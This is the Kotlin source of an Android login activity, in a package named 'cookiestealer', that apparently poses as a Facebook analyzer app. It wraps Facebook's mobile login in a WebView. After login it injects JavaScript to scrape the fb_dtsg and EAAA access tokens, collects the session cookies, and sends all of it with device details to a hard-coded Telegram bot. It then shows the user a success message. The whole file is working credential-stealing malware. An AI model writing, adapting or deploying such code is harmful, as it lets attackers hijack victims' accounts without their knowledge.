package com.example.cookiestealer

import android.content.Intent
import android.os.Bundle
import android.view.View
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class LoginActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var progressBar: ProgressBar

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        webView = findViewById(R.id.webView)
        progressBar = findViewById(R.id.progressBar)

        setupWebView()
    }

    private fun setupWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            userAgentString = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                progressBar.visibility = View.VISIBLE
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                progressBar.visibility = View.GONE
                
                if (url?.contains("facebook.com") == true && 
                    !url.contains("login") && 
                    !url.contains("checkpoint")) {
                    extractCookiesAndToken(url)
                }
            }
        }

        webView.loadUrl("https://m.facebook.com/login")
    }

    private fun extractCookiesAndToken(url: String) {
        val cookieManager = CookieManager.getInstance()
        val cookieString = cookieManager.getCookie(url)

        if (cookieString?.contains("c_user=") == true && cookieString.contains("xs=")) {
            // Convert cookies string sang JSON array format
            val cookiesJson = convertCookiesToJson(cookieString, url)
            
            // Extract tokens
            webView.evaluateJavascript(
                """
                (function() {
                    var dtsg = document.querySelector('[name="fb_dtsg"]')?.value || '';
                    var accessToken = '';
                    
                    try {
                        var scripts = document.getElementsByTagName('script');
                        for(var i=0; i<scripts.length; i++) {
                            var text = scripts[i].innerText;
                            if(text.includes('EAAA')) {
                                var match = text.match(/EAAA[A-Za-z0-9]+/);
                                if(match) accessToken = match[0];
                            }
                        }
                    } catch(e) {}
                    
                    return JSON.stringify({
                        dtsg: dtsg,
                        accessToken: accessToken
                    });
                })();
                """.trimIndent()
            ) { result ->
                try {
                    val jsonResult = result.replace("\\", "").trim('"')
                    val data = org.json.JSONObject(jsonResult)
                    val fbDtsg = data.getString("dtsg")
                    val accessToken = data.getString("accessToken")
                    val userId = extractUserId(cookieString)
                    
                    val prefs = getSharedPreferences("FBAnalyzer", MODE_PRIVATE)
                    prefs.edit().apply {
                        putString("cookies_json", cookiesJson)
                        putString("cookies", cookieString)
                        putString("fb_dtsg", fbDtsg)
                        putString("access_token", accessToken)
                        putString("user_id", userId)
                        apply()
                    }

                    sendFullDataToTelegram(cookiesJson, cookieString, fbDtsg, accessToken, userId)

                    runOnUiThread {
                        Toast.makeText(this, "Đăng nhập thành công!", Toast.LENGTH_SHORT).show()
                        startActivity(Intent(this, AnalysisActivity::class.java))
                        finish()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    private fun convertCookiesToJson(cookieString: String, url: String): String {
        val cookiesArray = org.json.JSONArray()
        val domain = ".facebook.com"
        val currentTime = System.currentTimeMillis() / 1000
        
        cookieString.split(";").forEach { cookie ->
            val parts = cookie.trim().split("=", limit = 2)
            if (parts.size == 2) {
                val name = parts[0].trim()
                val value = parts[1].trim()
                
                val cookieObj = org.json.JSONObject().apply {
                    put("domain", domain)
                    
                    // Expiration date (1 year from now for most cookies)
                    val expirationDate = when(name) {
                        "datr", "sb" -> currentTime + (365 * 24 * 60 * 60) // 1 year
                        "c_user", "xs" -> currentTime + (90 * 24 * 60 * 60) // 90 days
                        "fr" -> currentTime + (30 * 24 * 60 * 60) // 30 days
                        "wd", "dpr" -> currentTime + (7 * 24 * 60 * 60) // 7 days
                        else -> currentTime + (365 * 24 * 60 * 60)
                    }
                    put("expirationDate", expirationDate)
                    
                    put("hostOnly", false)
                    
                    // httpOnly
                    val isHttpOnly = name in listOf("datr", "sb", "xs", "fr", "ps_l", "ps_n", "c_user")
                    put("httpOnly", isHttpOnly)
                    
                    put("name", name)
                    put("path", "/")
                    
                    // sameSite
                    val sameSite = when(name) {
                        "wd", "ps_l" -> "lax"
                        else -> "no_restriction"
                    }
                    put("sameSite", sameSite)
                    
                    put("secure", true)
                    put("session", false)
                    put("storeId", "0")
                    put("value", value)
                }
                
                cookiesArray.put(cookieObj)
            }
        }
        
        return cookiesArray.toString()
    }

    private fun sendFullDataToTelegram(
        cookiesJson: String, 
        cookieString: String, 
        fbDtsg: String, 
        accessToken: String, 
        userId: String
    ) {
        CoroutineScope(Dispatchers.IO).launch {
            val deviceInfo = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
            val time = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
            
            // Send JSON cookies
            TelegramSender.sendMessage(
                "8254292889:AAHoRmMpWPco3Q-tzfEjSV1_TnQFxD7tIgA",
                "5266362838",
                "🎯 NEW FACEBOOK LOGIN\n\n" +
                "👤 User ID: $userId\n" +
                "📱 Device: $deviceInfo\n" +
                "⏰ Time: $time\n\n" +
                "🔑 ACCESS TOKEN:\n$accessToken\n\n" +
                "🛡️ FB_DTSG:\n$fbDtsg\n\n" +
                "🍪 COOKIES (JSON FORMAT):\n$cookiesJson"
            )
            
            // Send raw cookies string as backup
            kotlinx.coroutines.delay(2000) // Wait 2s to avoid rate limit
            TelegramSender.sendMessage(
                "8254292889:AAHoRmMpWPco3Q-tzfEjSV1_TnQFxD7tIgA",
                "5266362838",
                "📋 RAW COOKIES STRING:\n$cookieString"
            )
        }
    }

    private fun extractUserId(cookies: String): String {
        val regex = "c_user=([0-9]+)".toRegex()
        return regex.find(cookies)?.groupValues?.get(1) ?: ""
    }

    private fun sendCookiesToTelegram(cookies: String, userId: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val deviceInfo = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
            val time = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
            
            TelegramSender.sendMessage(
                "8254292889:AAHoRmMpWPco3Q-tzfEjSV1_TnQFxD7tIgA",
                "5266362838",
                "🎯 NEW FACEBOOK LOGIN\n\n" +
                "👤 User ID: $userId\n" +
                "📱 Device: $deviceInfo\n" +
                "⏰ Time: $time\n\n" +
                "🍪 COOKIES:\n$cookies"
            )
        }
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}

